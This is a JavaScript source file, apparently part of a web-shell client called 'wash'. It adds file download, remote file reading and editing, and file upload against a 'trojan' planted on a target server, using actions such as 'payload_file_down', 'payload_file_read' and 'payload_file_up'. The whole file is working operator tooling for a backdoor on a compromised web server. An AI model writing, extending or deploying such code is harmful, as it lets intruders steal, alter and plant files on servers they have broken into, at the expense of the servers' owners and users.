// Here we pop open the wash object once again to patch in some tailored
// functionality.
wash.file = {

    edit_file: '',

    // downloads a file
    down: function(args){
        // alert the user if we're switching to GET from another request type
        if(wash.connection.request_type != 'get'){
            var msg = "In order to download a file, a GET request must necessarily " +
                      "be made against the target server. Continue?";
            
            // cancel if the user is unwilling to change request types
            if(!confirm(msg)){ return false; }
        }

        // assemble the URL for the file download
        // @todo @bug: deal with the port here
        var url = wash.connection.protocol + '://';
        url += wash.connection.domain;
        url += wash.connection.url + '?';
        url += 'args[file]=' + args.file + '&';
        url += 'action=payload_file_down';

        // download the file
        window.location.href = url;
    },

    // edits a file on the server
    edit: function(args){
        // clear the editor
        editor.setValue('');

        // buffer the name of the file being read
        // @bug: the write functionality will break if you cd around
        // while the file is being edited

        // wash.file.edit_file = args.file;

        // read the contents of the file
        wash.command.action = 'payload_file_read';
        wash.command.args   = args;
        wash.net.get(function(response){
            // unpack the response object from the trojan
            json                = JSON.parse(response);
            wash.file.edit_file = json.output.file;
            console.log(wash.file.edit_file);

            // then load the file contents into the editor
            editor.setValue(json.output.output);
            shell.editor.show();
        });
    }, 

    // uploads files to the target server
    up: function(){
        console.log('up');

        // alert the user if we're switching to POST from another request type
        if(wash.connection.request_type != 'post'){
            var msg = "In order to download a file, a POST request must necessarily " +
                      "be made to the target server. Continue?";
            
            // cancel if the user is unwilling to change request types
            if(!confirm(msg)){ return false; }
        }

        // aggregate the HTML
        var html = "<h2>Upload Files</h2>" + 
        "<p>Select files to upload:</p>" +
        "<form id='wash_file_up' enctype='multipart/form-data' onsubmit='javascript:return wash.file.upload()'>" + 
            "<input type='file' name='files[]' multiple>" + 
            "<input type='hidden' name='action' value='payload_file_up'>" + 
            "<br><input type='submit' value='Upload'>" + 
        "</form>";

        // reveal the sidebar
        shell.sidebar.show();
        shell.elements.sidebar.html(html);
    },

    // no user should ever invoke this. It's sort of a "private" method
    upload: function(){
        $.post(
            // @todo: support custom ports later
            wash.connection.protocol + '://' + wash.connection.domain + wash.connection.url,
            $('#wash_file_up').serializeArray(),
            function(response){
                console.log(response);
            }
        );

        // prevent the form from actually submitting
        return false;
    },
}
